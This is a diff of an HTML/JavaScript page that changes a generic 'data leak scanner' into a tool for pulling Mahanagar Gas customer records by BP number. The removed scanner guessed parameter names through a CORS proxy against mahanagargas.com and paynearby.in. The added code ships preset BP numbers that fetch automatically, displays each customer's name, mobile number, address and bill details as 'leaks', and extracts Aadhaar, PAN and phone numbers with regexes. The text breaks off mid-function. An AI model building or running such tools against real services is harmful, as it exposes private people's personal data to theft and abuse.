@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>🤖 Autonomous AI Data Leak Scanner</title>
+    <title>🔍 MGL Data Fetcher</title>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet" />
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
     <style>
@@ -18,9 +18,9 @@
         ::-webkit-scrollbar { width: 5px; height: 5px; }
         ::-webkit-scrollbar-track { background: #0d1520; border-radius: 10px; }
         ::-webkit-scrollbar-thumb { background: #1e2d4a; border-radius: 10px; }
-        ::-webkit-scrollbar-thumb:hover { background: #8b5cf6; }
+        ::-webkit-scrollbar-thumb:hover { background: #f59e0b; }
 
-        .container { max-width: 1400px; margin: 0 auto; }
+        .container { max-width: 900px; margin: 0 auto; }
 
         .header {
             display: flex;
@@ -34,38 +34,31 @@
         }
         .brand { display: flex; align-items: center; gap: 14px; }
         .brand-icon {
-            width: 48px; height: 48px;
-            background: linear-gradient(135deg, #8b5cf6, #6d28d9);
-            border-radius: 14px;
+            width: 44px; height: 44px;
+            background: linear-gradient(135deg, #f59e0b, #d97706);
+            border-radius: 12px;
             display: flex;
             align-items: center;
             justify-content: center;
-            font-size: 22px;
-            box-shadow: 0 0 40px rgba(139,92,246,0.2);
+            font-size: 20px;
+            box-shadow: 0 0 30px rgba(245,158,11,0.15);
         }
-        .brand h1 {
-            font-size: 22px;
-            font-weight: 800;
-            background: linear-gradient(135deg, #eef2ff, #8b5cf6);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-        }
-        .brand small { display: block; font-size: 11px; color: #64748b; -webkit-text-fill-color: #64748b; }
+        .brand h1 { font-size: 20px; font-weight: 800; }
+        .brand h1 span { color: #f59e0b; }
+        .brand small { display: block; font-size: 11px; color: #64748b; }
 
-        .badge-ai {
+        .badge {
+            padding: 6px 18px;
+            background: #111827;
+            border-radius: 50px;
+            border: 1px solid #1e2d4a;
+            font-size: 12px;
+            color: #94a3b8;
             display: flex;
             align-items: center;
             gap: 8px;
-            padding: 6px 18px;
-            background: linear-gradient(135deg, #8b5cf6, #6d28d9);
-            border-radius: 50px;
-            border: 1px solid #8b5cf6;
-            font-size: 12px;
-            font-weight: 600;
-            color: #eef2ff;
-            box-shadow: 0 0 30px rgba(139,92,246,0.2);
         }
-        .badge-ai .pulse {
+        .badge .dot {
             width: 8px; height: 8px;
             border-radius: 50%;
             background: #22c55e;
@@ -102,41 +95,45 @@
         }
         .card-body { padding: 24px; }
 
-        .input-grid {
-            display: grid;
-            grid-template-columns: 2fr 1fr 1fr;
+        .input-group {
+            display: flex;
             gap: 12px;
+            flex-wrap: wrap;
         }
-        @media (max-width: 900px) { .input-grid { grid-template-columns: 1fr 1fr; } }
-        @media (max-width: 500px) { .input-grid { grid-template-columns: 1fr; } }
-
-        .field { position: relative; }
-        .field i {
+        .input-group .field {
+            flex: 1;
+            min-width: 200px;
+            position: relative;
+        }
+        .input-group .field i {
             position: absolute;
             left: 14px;
             top: 50%;
             transform: translateY(-50%);
             color: #64748b;
         }
-        .field input {
+        .input-group .field input {
             width: 100%;
             padding: 14px 14px 14px 44px;
             background: #060b18;
             border: 2px solid #1a2744;
             border-radius: 10px;
             color: #eef2ff;
-            font-size: 14px;
+            font-size: 15px;
             font-family: 'Inter', sans-serif;
             outline: none;
             transition: all 0.3s;
         }
-        .field input:focus {
-            border-color: #8b5cf6;
-            box-shadow: 0 0 0 4px rgba(139,92,246,0.12);
+        .input-group .field input:focus {
+            border-color: #f59e0b;
+            box-shadow: 0 0 0 4px rgba(245,158,11,0.12);
+        }
+        .input-group .field input::placeholder {
+            color: #475569;
         }
 
         .btn {
-            padding: 14px 24px;
+            padding: 14px 28px;
             border: none;
             border-radius: 10px;
             font-size: 14px;
@@ -147,18 +144,18 @@
             display: flex;
             align-items: center;
             gap: 8px;
-            justify-content: center;
+            white-space: nowrap;
         }
-        .btn-ai {
-            background: linear-gradient(135deg, #8b5cf6, #6d28d9);
+        .btn-primary {
+            background: linear-gradient(135deg, #f59e0b, #d97706);
             color: #fff;
-            box-shadow: 0 4px 20px rgba(139,92,246,0.25);
+            box-shadow: 0 4px 20px rgba(245,158,11,0.18);
         }
-        .btn-ai:hover:not(:disabled) {
+        .btn-primary:hover:not(:disabled) {
             transform: translateY(-2px);
-            box-shadow: 0 8px 30px rgba(139,92,246,0.35);
+            box-shadow: 0 8px 30px rgba(245,158,11,0.25);
         }
-        .btn-ai:disabled { opacity: 0.5; cursor: not-allowed; transform: none; }
+        .btn-primary:disabled { opacity: 0.5; cursor: not-allowed; transform: none; }
         .btn-secondary {
             background: #1a2744;
             color: #94a3b8;
@@ -168,6 +165,35 @@
 
         .flex-row { display: flex; gap: 12px; flex-wrap: wrap; margin-top: 16px; }
 
+        /* ─── QUICK SAMPLES ─── */
+        .quick-samples {
+            display: flex;
+            gap: 8px;
+            flex-wrap: wrap;
+            margin-top: 12px;
+        }
+        .quick-samples span {
+            color: #64748b;
+            font-size: 12px;
+            margin-right: 6px;
+        }
+        .quick-samples button {
+            padding: 4px 14px;
+            background: #0d1520;
+            border: 1px solid #1a2744;
+            border-radius: 50px;
+            color: #94a3b8;
+            font-size: 12px;
+            font-family: 'Inter', sans-serif;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+        .quick-samples button:hover {
+            border-color: #f59e0b;
+            color: #eef2ff;
+        }
+
+        /* ─── STATUS ─── */
         #status {
             padding: 12px 16px;
             border-radius: 10px;
@@ -178,220 +204,113 @@
         #status.info { background: #0d1a2b; border: 1px solid #3b82f6; color: #3b82f6; display: block; }
         #status.success { background: #0d1c0d; border: 1px solid #22c55e; color: #22c55e; display: block; }
         #status.error { background: #1c0d0d; border: 1px solid #ef4444; color: #ef4444; display: block; }
-        #status.warning { background: #1c1a0d; border: 1px solid #eab308; color: #eab308; display: block; }
+        #status.warning { background: #1c1a0d; border: 1px solid #f59e0b; color: #f59e0b; display: block; }
 
-        .stat-box {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
-            gap: 10px;
-            margin: 12px 0;
+        /* ─── RESULT ─── */
+        #result {
             display: none;
+            margin-top: 16px;
         }
-        .stat-item {
-            background: #0d1520;
-            border: 1px solid #1a2744;
-            border-radius: 8px;
-            padding: 10px 14px;
-            text-align: center;
-        }
-        .stat-item .num { font-size: 24px; font-weight: 800; }
-        .stat-item .label { font-size: 11px; color: #64748b; }
-        .stat-item .num.red { color: #ef4444; }
-        .stat-item .num.green { color: #22c55e; }
-        .stat-item .num.yellow { color: #eab308; }
-        .stat-item .num.blue { color: #3b82f6; }
-        .stat-item .num.purple { color: #8b5cf6; }
 
-        .progress-wrap { display: none; margin: 12px 0; }
-        .progress-bar {
-            width: 100%;
-            height: 6px;
+        .result-card {
             background: #0d1520;
-            border-radius: 10px;
+            border-radius: 12px;
+            border: 1px solid #1a2744;
             overflow: hidden;
         }
-        .progress-bar .fill {
-            height: 100%;
-            width: 0%;
-            background: linear-gradient(90deg, #8b5cf6, #22c55e);
-            border-radius: 10px;
-            transition: width 0.3s;
-        }
-        .progress-text {
-            display: flex;
-            justify-content: space-between;
-            font-size: 12px;
-            color: #64748b;
-            margin-top: 4px;
-        }
 
-        #results { display: none; margin-top: 16px; }
-
-        .result-tabs {
-            display: flex;
-            gap: 4px;
-            background: #0d1520;
-            border-radius: 10px;
-            padding: 4px;
-            border: 1px solid #1a2744;
-            flex-wrap: wrap;
-            margin-bottom: 16px;
-        }
-        .result-tabs button {
-            padding: 10px 20px;
-            background: transparent;
-            border: none;
-            border-radius: 8px;
-            color: #8b949e;
-            font-size: 13px;
-            font-family: 'Inter', sans-serif;
-            cursor: pointer;
-            transition: all 0.2s;
-        }
-        .result-tabs button:hover { color: #eef2ff; }
-        .result-tabs button.active {
-            background: #1a2744;
-            color: #eef2ff;
-        }
-        .result-tabs button .count {
-            background: #1a2744;
-            padding: 1px 8px;
-            border-radius: 50px;
-            font-size: 11px;
-            margin-left: 6px;
-        }
-        .result-tabs button.active .count { background: #0d1520; }
-
-        .tab-content {
-            display: none;
-            max-height: 600px;
-            overflow-y: auto;
-        }
-        .tab-content.active { display: block; }
-
-        /* ─── AI ANALYSIS ─── */
-        .ai-analysis {
-            background: linear-gradient(135deg, #0d1a2b, #1a0d2b);
-            border: 1px solid #8b5cf6;
-            border-radius: 12px;
+        .result-header {
             padding: 16px 20px;
-            margin-bottom: 16px;
-        }
-        .ai-analysis .ai-header {
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            margin-bottom: 10px;
-        }
-        .ai-analysis .ai-header .ai-icon {
-            width: 32px; height: 32px;
-            background: linear-gradient(135deg, #8b5cf6, #6d28d9);
-            border-radius: 8px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 14px;
-            color: #fff;
-        }
-        .ai-analysis .ai-header .ai-title {
-            font-weight: 700;
-            font-size: 15px;
-            color: #8b5cf6;
-        }
-        .ai-analysis .ai-content {
-            color: #94a3b8;
-            font-size: 14px;
-            line-height: 1.6;
-        }
-        .ai-analysis .ai-content .highlight-ai { color: #8b5cf6; font-weight: 600; }
-        .ai-analysis .ai-content .danger-ai { color: #ef4444; font-weight: 600; }
-        .ai-analysis .ai-content .safe-ai { color: #22c55e; font-weight: 600; }
-
-        .leak-item {
-            background: #0d1520;
-            border: 1px solid #1a2744;
-            border-radius: 8px;
-            padding: 14px 18px;
-            margin-bottom: 10px;
-            border-left: 4px solid #ef4444;
-        }
-        .leak-item .header {
+            background: #1c0d0d;
+            border-bottom: 1px solid #ef4444;
             display: flex;
             justify-content: space-between;
             align-items: center;
             flex-wrap: wrap;
+            gap: 10px;
+        }
+        .result-header .title {
+            color: #ef4444;
+            font-weight: 700;
+            font-size: 18px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        .result-header .badge-risk {
+            background: #ef4444;
+            color: #fff;
+            padding: 4px 16px;
+            border-radius: 50px;
+            font-size: 12px;
+            font-weight: 600;
+        }
+
+        .result-body { padding: 20px; }
+
+        .result-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
             gap: 8px;
         }
-        .leak-item .header .type { font-weight: 600; color: #ef4444; }
-        .leak-item .header .location {
-            font-size: 12px;
-            color: #64748b;
-            font-family: 'Courier New', monospace;
-            word-break: break-all;
-        }
-        .leak-item .header .badge-leak {
-            background: #1c0d0d;
-            color: #ef4444;
-            padding: 2px 12px;
-            border-radius: 50px;
-            font-size: 11px;
-            border: 1px solid #ef4444;
-        }
-        .leak-item .value {
-            margin-top: 8px;
-            padding: 8px 12px;
-            background: #060b18;
-            border-radius: 4px;
-            font-family: 'Courier New', monospace;
-            font-size: 13px;
-            color: #eef2ff;
-            word-break: break-all;
-        }
-        .leak-item .context {
-            margin-top: 6px;
-            font-size: 12px;
-            color: #64748b;
-            font-family: 'Courier New', monospace;
-            word-break: break-all;
-            background: #060b18;
-            padding: 6px 10px;
-            border-radius: 4px;
-        }
-        .leak-item .param-used {
-            margin-top: 6px;
-            font-size: 11px;
-            color: #8b5cf6;
-            font-family: 'Courier New', monospace;
-        }
+        @media (max-width: 600px) { .result-grid { grid-template-columns: 1fr; } }
 
-        .source-view {
+        .result-item {
+            display: flex;
+            justify-content: space-between;
+            padding: 10px 16px;
             background: #060b18;
             border-radius: 8px;
             border: 1px solid #0d1520;
+            align-items: center;
+        }
+        .result-item .label {
+            color: #8b949e;
+            font-size: 13px;
+            font-weight: 500;
+        }
+        .result-item .value {
+            color: #eef2ff;
+            font-weight: 600;
+            font-size: 14px;
+            text-align: right;
+            word-break: break-all;
+        }
+        .result-item .value.leak { color: #ef4444; }
+        .result-item .value.safe { color: #22c55e; }
+
+        .response-box {
+            background: #060b18;
+            border-radius: 8px;
             padding: 16px;
             font-family: 'JetBrains Mono', monospace;
             font-size: 12px;
             color: #94a3b8;
             white-space: pre-wrap;
             word-break: break-all;
-            max-height: 500px;
+            max-height: 300px;
             overflow-y: auto;
-            line-height: 1.6;
+            border: 1px solid #0d1520;
+            margin-top: 16px;
         }
-        .source-view .highlight {
-            background: #1c0d0d;
-            color: #ef4444;
-            padding: 1px 4px;
-            border-radius: 3px;
-            border: 1px solid #ef4444;
+
+        .spinner {
+            display: inline-block;
+            width: 18px;
+            height: 18px;
+            border: 2px solid #1a2744;
+            border-top-color: #f59e0b;
+            border-radius: 50%;
+            animation: spin 0.7s linear infinite;
         }
+        @keyframes spin { to { transform: rotate(360deg); } }
 
         .log-area {
             background: #060b18;
             border-radius: 10px;
             border: 1px solid #1a2744;
             padding: 16px;
-            max-height: 200px;
+            max-height: 150px;
             overflow-y: auto;
             font-family: 'Courier New', monospace;
             font-size: 12px;
@@ -404,19 +323,7 @@
         .log-area .success { color: #22c55e; }
         .log-area .error { color: #ef4444; }
         .log-area .info { color: #3b82f6; }
-        .log-area .warning { color: #eab308; }
-        .log-area .ai { color: #8b5cf6; }
-
-        .spinner {
-            display: inline-block;
-            width: 18px;
-            height: 18px;
-            border: 2px solid #1a2744;
-            border-top-color: #8b5cf6;
-            border-radius: 50%;
-            animation: spin 0.7s linear infinite;
-        }
-        @keyframes spin { to { transform: rotate(360deg); } }
+        .log-area .warning { color: #f59e0b; }
 
         .footer {
             margin-top: 28px;
@@ -430,29 +337,6 @@
             color: #475569;
         }
         .footer .warn { color: #ef4444; }
-        .footer .ai-tag { color: #8b5cf6; }
-
-        .preset-buttons {
-            display: flex;
-            gap: 8px;
-            flex-wrap: wrap;
-            margin-top: 12px;
-        }
-        .preset-buttons button {
-            padding: 6px 16px;
-            background: #0d1520;
-            border: 1px solid #1a2744;
-            border-radius: 50px;
-            color: #94a3b8;
-            font-size: 12px;
-            font-family: 'Inter', sans-serif;
-            cursor: pointer;
-            transition: all 0.2s;
-        }
-        .preset-buttons button:hover {
-            border-color: #8b5cf6;
-            color: #eef2ff;
-        }
 
         .toast {
             position: fixed;
@@ -471,31 +355,6 @@
             pointer-events: none;
         }
         .toast.show { opacity: 1; transform: translateY(0); }
-
-        .empty-state {
-            text-align: center;
-            padding: 40px;
-            color: #64748b;
-        }
-        .empty-state i { font-size: 48px; display: block; margin-bottom: 12px; color: #1a2744; }
-        .empty-state h3 { color: #94a3b8; font-weight: 400; }
-
-        .data-type-badge {
-            display: inline-block;
-            padding: 2px 12px;
-            border-radius: 50px;
-            font-size: 11px;
-            font-weight: 600;
-            margin-right: 8px;
-        }
-        .data-type-badge.mobile { background: #0d1a2b; color: #3b82f6; border: 1px solid #3b82f6; }
-        .data-type-badge.email { background: #1c1a0d; color: #eab308; border: 1px solid #eab308; }
-        .data-type-badge.bp { background: #1c0d0d; color: #ef4444; border: 1px solid #ef4444; }
-        .data-type-badge.aadhar { background: #0d1c0d; color: #22c55e; border: 1px solid #22c55e; }
-        .data-type-badge.pan { background: #1a0d2b; color: #8b5cf6; border: 1px solid #8b5cf6; }
-        .data-type-badge.name { background: #0d1520; color: #f59e0b; border: 1px solid #f59e0b; }
-        .data-type-badge.id { background: #0d1a2b; color: #06b6d4; border: 1px solid #06b6d4; }
-        .data-type-badge.default { background: #0d1520; color: #64748b; border: 1px solid #64748b; }
     </style>
 </head>
 <body>
@@ -505,150 +364,82 @@
     <!-- ─── HEADER ─── -->
     <div class="header">
         <div class="brand">
-            <div class="brand-icon"><i class="fas fa-brain"></i></div>
+            <div class="brand-icon"><i class="fas fa-fire"></i></div>
             <div>
-                <h1>Auto<span>Scan</span></h1>
-                <small>AI-Powered Autonomous Data Leak Scanner</small>
+                <h1>MGL<span>Fetcher</span></h1>
+                <small>Mahanagar Gas – Live Data Viewer</small>
             </div>
         </div>
-        <div class="badge-ai">
-            <span class="pulse"></span>
-            <span><i class="fas fa-robot"></i> DeepSeek AI</span>
+        <div class="badge">
+            <span class="dot"></span>
+            <span>Live API</span>
         </div>
     </div>
 
     <!-- ─── MAIN CARD ─── -->
     <div class="card">
         <div class="card-header">
-            <h2><i class="fas fa-search" style="color:#8b5cf6;"></i> Enter Website & Data</h2>
-            <span style="color:#64748b;font-size:12px;">AI auto-detects data type and searches everywhere</span>
+            <h2><i class="fas fa-search" style="color:#f59e0b;"></i> Enter BP Number</h2>
+            <span style="color:#64748b;font-size:12px;">Fetch customer details from MGL API</span>
         </div>
         <div class="card-body">
 
-            <div class="input-grid">
+            <!-- ─── INPUT ─── -->
+            <div class="input-group">
                 <div class="field">
-                    <i class="fas fa-globe"></i>
-                    <input type="text" id="targetUrl" placeholder="Website URL (e.g. https://example.com)" value="https://www.mahanagargas.com" />
+                    <i class="fas fa-hashtag"></i>
+                    <input type="text" id="bpInput" placeholder="Enter BP Number (e.g. 1100081583)" value="1100081583" />
                 </div>
-                <div class="field">
-                    <i class="fas fa-database"></i>
-                    <input type="text" id="searchData" placeholder="Enter any data (mobile, email, ID, etc.)" value="7505757889" />
-                </div>
-                <div class="field">
-                    <i class="fas fa-tag"></i>
-                    <input type="text" id="customParam" placeholder="Optional: specific param (e.g. mobile)" value="" />
-                </div>
-            </div>
-
-            <div class="preset-buttons">
-                <span style="color:#64748b;font-size:12px;margin-right:6px;">Quick Test:</span>
-                <button onclick="setPreset('mgl')">MGL Gas</button>
-                <button onclick="setPreset('paynearby')">PayNearby</button>
-                <button onclick="setPreset('mobile')">Mobile</button>
-                <button onclick="setPreset('email')">Email</button>
-                <button onclick="setPreset('bp')">BP Number</button>
-            </div>
-
-            <div class="flex-row">
-                <button class="btn btn-ai" id="scanBtn" style="flex:1;">
-                    <i class="fas fa-brain"></i> AI Auto Scan
+                <button class="btn btn-primary" id="fetchBtn">
+                    <i class="fas fa-download"></i> Fetch Data
                 </button>
                 <button class="btn btn-secondary" onclick="clearAll()">
                     <i class="fas fa-times"></i> Clear
                 </button>
             </div>
 
+            <!-- ─── QUICK SAMPLES ─── -->
+            <div class="quick-samples">
+                <span>Quick:</span>
+                <button onclick="setBP('1100081583')">1100081583</button>
+                <button onclick="setBP('1100081082')">1100081082</button>
+                <button onclick="setBP('50246713')">50246713</button>
+            </div>
+
+            <!-- ─── STATUS ─── -->
             <div id="status"></div>
 
-            <div class="progress-wrap" id="progressWrap">
-                <div class="progress-bar"><div class="fill" id="progressFill"></div></div>
-                <div class="progress-text">
-                    <span id="progressLabel">0 / 0</span>
-                    <span id="progressPercent">0%</span>
-                </div>
-            </div>
+            <!-- ─── RESULT ─── -->
+            <div id="result"></div>
 
-            <div class="stat-box" id="statBox">
-                <div class="stat-item"><div class="num blue" id="statPages">0</div><div class="label">Pages/APIs</div></div>
-                <div class="stat-item"><div class="num yellow" id="statParams">0</div><div class="label">Params Tested</div></div>
-                <div class="stat-item"><div class="num red" id="statLeaks">0</div><div class="label">Leaks Found</div></div>
-                <div class="stat-item"><div class="num purple" id="statMatches">0</div><div class="label">AI Matches</div></div>
-            </div>
-
-            <div id="results">
-                <div class="result-tabs">
-                    <button class="active" data-tab="leaks"><i class="fas fa-bug"></i> Leaks <span class="count" id="leakCount">0</span></button>
-                    <button data-tab="ai"><i class="fas fa-brain" style="color:#8b5cf6;"></i> AI Analysis</button>
-                    <button data-tab="source"><i class="fas fa-code"></i> Page Source</button>
-                    <button data-tab="apis"><i class="fas fa-plug"></i> APIs <span class="count" id="apiCount">0</span></button>
-                </div>
-                <div class="tab-content active" id="tab-leaks"></div>
-                <div class="tab-content" id="tab-ai"></div>
-                <div class="tab-content" id="tab-source"></div>
-                <div class="tab-content" id="tab-apis"></div>
-            </div>
-
+            <!-- ─── LOG ─── -->
             <div class="log-area" id="logArea"></div>
 
         </div>
     </div>
 
+    <!-- ─── FOOTER ─── -->
     <div class="footer">
-        <span><span class="warn">⚠️</span> AI auto-detects: Mobile, Email, BP, Aadhar, PAN, Name, ID</span>
-        <span><span class="ai-tag"><i class="fas fa-brain"></i> Powered by DeepSeek AI</span></span>
+        <span><span class="warn">⚠️</span> Data fetched from <code>mahanagargas.com</code></span>
+        <span>For authorized testing only</span>
     </div>
+
 </div>
 
 <div class="toast" id="toast">✅ Copied!</div>
 
 <script>
     // ─── DOM ───
-    const targetUrl = document.getElementById('targetUrl');
-    const searchData = document.getElementById('searchData');
-    const customParam = document.getElementById('customParam');
-    const scanBtn = document.getElementById('scanBtn');
+    const bpInput = document.getElementById('bpInput');
+    const fetchBtn = document.getElementById('fetchBtn');
     const statusDiv = document.getElementById('status');
     const logArea = document.getElementById('logArea');
-    const resultsDiv = document.getElementById('results');
-    const progressWrap = document.getElementById('progressWrap');
-    const progressFill = document.getElementById('progressFill');
-    const progressLabel = document.getElementById('progressLabel');
-    const progressPercent = document.getElementById('progressPercent');
-    const statBox = document.getElementById('statBox');
-    const statPages = document.getElementById('statPages');
-    const statParams = document.getElementById('statParams');
-    const statLeaks = document.getElementById('statLeaks');
-    const statMatches = document.getElementById('statMatches');
-    const leakCount = document.getElementById('leakCount');
-    const apiCount = document.getElementById('apiCount');
+    const resultDiv = document.getElementById('result');
 
-    let isRunning = false;
-    let allResults = {};
-
-    // ─── PRESETS ───
-    function setPreset(type) {
-        if (type === 'mgl') {
-            targetUrl.value = 'https://www.mahanagargas.com';
-            searchData.value = '7505757889';
-            customParam.value = '';
-        } else if (type === 'paynearby') {
-            targetUrl.value = 'https://paynearby.in';
-            searchData.value = '8809559017';
-            customParam.value = '';
-        } else if (type === 'mobile') {
-            targetUrl.value = 'https://www.mahanagargas.com';
-            searchData.value = '9876543210';
-            customParam.value = 'mobile';
-        } else if (type === 'email') {
-            targetUrl.value = 'https://www.mahanagargas.com';
-            searchData.value = 'test@example.com';
-            customParam.value = 'email';
-        } else if (type === 'bp') {
-            targetUrl.value = 'https://www.mahanagargas.com';
-            searchData.value = '1100081082';
-            customParam.value = 'bpNumber';
-        }
-        clearAll();
+    // ─── SET BP ───
+    function setBP(val) {
+        bpInput.value = val;
+        fetchBtn.click();
     }
 
     // ─── LOG ───
@@ -670,15 +461,9 @@
     function clearAll() {
         logArea.innerHTML = '';
         logArea.style.display = 'none';
-        resultsDiv.style.display = 'none';
-        statBox.style.display = 'none';
-        progressWrap.style.display = 'none';
+        resultDiv.innerHTML = '';
+        resultDiv.style.display = 'none';
         statusDiv.style.display = 'none';
-        document.getElementById('tab-leaks').innerHTML = '';
-        document.getElementById('tab-ai').innerHTML = '';
-        document.getElementById('tab-source').innerHTML = '';
-        document.getElementById('tab-apis').innerHTML = '';
-        allResults = {};
     }
 
     function showToast(msg) {
@@ -696,448 +481,189 @@
         return div.innerHTML;
     }
 
-    // ─── AI DATA TYPE DETECTION ───
-    function detectDataType(data) {
-        if (!data) return { type: 'unknown', label: '❓ Unknown' };
-
-        const trimmed = data.trim();
-
-        // Mobile number
-        if (/^[6-9][0-9]{9}$/.test(trimmed)) {
-            return { type: 'mobile', label: '📱 Mobile Number', badge: 'mobile' };
-        }
-
-        // Email
-        if (/^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/.test(trimmed)) {
-            return { type: 'email', label: '📧 Email Address', badge: 'email' };
-        }
-
-        // Aadhar
-        if (/^[2-9][0-9]{11}$/.test(trimmed)) {
-            return { type: 'aadhar', label: '🆔 Aadhar Number', badge: 'aadhar' };
-        }
-
-        // PAN
-        if (/^[A-Z]{5}[0-9]{4}[A-Z]{1}$/.test(trimmed)) {
-            return { type: 'pan', label: '📄 PAN Number', badge: 'pan' };
-        }
-
-        // BP Number (starts with 50 or 11)
-        if (/^(50|11)[0-9]{6,8}$/.test(trimmed)) {
-            return { type: 'bp', label: '🔑 BP Number', badge: 'bp' };
-        }
-
-        // Customer ID / User ID (alphanumeric with numbers)
-        if (/^[A-Z0-9]{6,15}$/i.test(trimmed)) {
-            return { type: 'id', label: '🆔 Customer ID', badge: 'id' };
-        }
-
-        // Name (contains letters and spaces)
-        if (/^[a-zA-Z\s\.]{3,40}$/.test(trimmed)) {
-            return { type: 'name', label: '👤 Name', badge: 'name' };
-        }
-
-        return { type: 'unknown', label: '❓ Unknown', badge: 'default' };
+    // ─── FORMAT CURRENCY ───
+    function fmt(num) {
+        if (!num) return '0.00';
+        return parseFloat(num).toFixed(2);
     }
 
-    // ─── AI PARAMETER SUGGESTIONS ───
-    function suggestParams(dataType, url) {
-        const params = [];
-
-        // Common param names based on data type
-        if (dataType === 'mobile') {
-            params.push('mobile', 'phone', 'mob', 'contact', 'phone_number', 'mobileno', 'phoneNo', 'customer_mobile');
-        } else if (dataType === 'email') {
-            params.push('email', 'mail', 'email_id', 'user_email', 'customer_email');
-        } else if (dataType === 'bp') {
-            params.push('bpNumber', 'bp', 'bp_no', 'BP', 'bpnumber', 'customer_id', 'customerId');
-        } else if (dataType === 'aadhar') {
-            params.push('aadhar', 'aadhar_number', 'uid', 'aadhaar', 'customer_aadhar');
-        } else if (dataType === 'pan') {
-            params.push('pan', 'pan_number', 'pan_no', 'customer_pan');
-        } else if (dataType === 'name') {
-            params.push('name', 'full_name', 'customer_name', 'user_name', 'cname');
-        } else if (dataType === 'id') {
-            params.push('id', 'user_id', 'customer_id', 'customerId', 'uid', 'userId');
-        }
-
-        // Add generic params
-        params.push('data', 'value', 'input', 'search', 'query', 'q');
-
-        // Website specific param suggestions
-        if (url.includes('mahanagargas') || url.includes('mgl')) {
-            params.push('bpNumber', 'bp', 'caNumber', 'ca', 'billNumber', 'customerId', 'customer_id');
-        }
-        if (url.includes('paynearby')) {
-            params.push('mobile', 'phone', 'customer_id', 'userId');
-        }
-
-        // Remove duplicates
-        return [...new Set(params)];
-    }
-
-    // ─── FETCH PAGE ───
-    async function fetchPage(url) {
-        try {
-            const proxy = 'https://corsproxy.io/?';
-            const response = await fetch(proxy + encodeURIComponent(url), {
-                signal: AbortSignal.timeout(10000)
-            });
-            const text = await response.text();
-            return { status: response.status, text };
-        } catch (e) {
-            return { status: 0, text: `Error: ${e.message}` };
-        }
-    }
-
-    // ─── FIND APIS ───
-    function findApis(text, baseUrl) {
-        const apis = [];
+    // ─── DETECT LEAK ───
+    function detectLeak(text) {
+        const leaks = [];
         const patterns = [
-            /(?:fetch|axios|ajax|\.get|\.post|\.put|\.delete)\s*\(\s*['"]([^'"]+)['"]/gi,
-            /url\s*:\s*['"]([^'"]+)['"]/gi,
-            /action\s*=\s*['"]([^'"]+)['"]/gi,
-            /href\s*=\s*['"]([^'"]*\.(?:json|xml|api|php|aspx))['"]/gi,
-            /src\s*=\s*['"]([^'"]*\.(?:js|css|json))['"]/gi
+            { type: '📱 Mobile', regex: /[6-9][0-9]{9}/g },
+            { type: '📧 Email', regex: /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g },
+            { type: '📍 Address', regex: /(?:maharashtra|mumbai|pune|delhi|bangalore|chennai|kolkata|hyderabad|road|street|building|flat|society|colony|nagar|chowk)/gi },
+            { type: '👤 Name', regex: /(?:mr\.|ms\.|mrs\.|dr\.|shri|smt)\.?\s+[a-z]{2,}/gi },
+            { type: '🆔 Aadhar', regex: /[2-9][0-9]{11}/g },
+            { type: '📄 PAN', regex: /[A-Z]{5}[0-9]{4}[A-Z]{1}/g },
+            { type: '🏠 PIN', regex: /\b[1-9][0-9]{5}\b/g }
+        ];
+        for (const p of patterns) {
+            let match;
+            while ((match = p.regex.exec(text)) !== null) {
+                if (match[0]) {
+                    leaks.push({ type: p.type, value: match[0] });
+                }
+            }
+        }
+        const unique = [];
+        const seen = new Set();
+        for (const l of leaks) {
+            const key = l.type + l.value;
+            if (!seen.has(key)) { seen.add(key); unique.push(l); }
+        }
+        return unique;
+    }
+
+    // ─── BUILD RESULT ───
+    function buildResult(data, responseText, leaks, bp) {
+        const hasLeak = leaks.length > 0;
+        const d = data.response || data;
+
+        const fields = [
+            { label: '👤 Customer Name', key: 'full_name', value: d.full_name, leak: true },
+            { label: '📱 Mobile', key: 'mobile', value: d.mobile, leak: true },
+            { label: '📍 Location', key: 'location', value: d.location, leak: true },
+            { label: '🏠 House Number', key: 'house_number', value: d.house_number, leak: true },
+            { label: '🏙️ City', key: 'city', value: d.city, leak: true },
+            { label: '📮 Postal Code', key: 'postal_code', value: d.postal_code, leak: true },
+            { label: '📋 BP Number', key: 'bp_number', value: d.bp_number || bp, leak: false },
+            { label: '🆔 CA Number', key: 'ca_number', value: d.ca_number || d.bp_master_id, leak: false },
+            { label: '🧾 Bill Number', key: 'bill_number', value: d.bill_number, leak: false },
+            { label: '📅 Bill Date', key: 'document_date', value: d.document_date, leak: false },
+            { label: '📅 Due Date', key: 'due_date', value: d.due_date, leak: false },
+            { label: '💰 Total Bill', key: 'total_bil_amount', value: d.total_bil_amount, leak: false },
+            { label: '💵 Amount to Pay', key: 'amount_to_be_paid', value: d.amount_to_be_paid, leak: false },
+            { label: '📊 Consumption', key: 'consumption', value: d.consumption, leak: false },
         ];
 
-        for (const pattern of patterns) {
-            let match;
-            while ((match = pattern.exec(text)) !== null) {
-                let url = match[1];
-                if (url.startsWith('/')) {
-                    url = baseUrl + url;
-                } else if (url.startsWith('./')) {
-                    url = baseUrl + url.substring(1);
-                } else if (!url.startsWith('http://') && !url.startsWith('https://')) {
-                    url = baseUrl + '/' + url;
-                }
-                if (url && !apis.includes(url)) {
-                    apis.push(url);
-                }
-            }
-        }
+        let itemsHTML = fields
+            .filter(f => f.value)
+            .map(f => `
+                <div class="result-item">
+                    <span class="label">${f.label}</span>
+                    <span class="value ${f.leak ? 'leak' : 'safe'}">${escapeHtml(f.value)}</span>
+                </div>
+            `).join('');
 
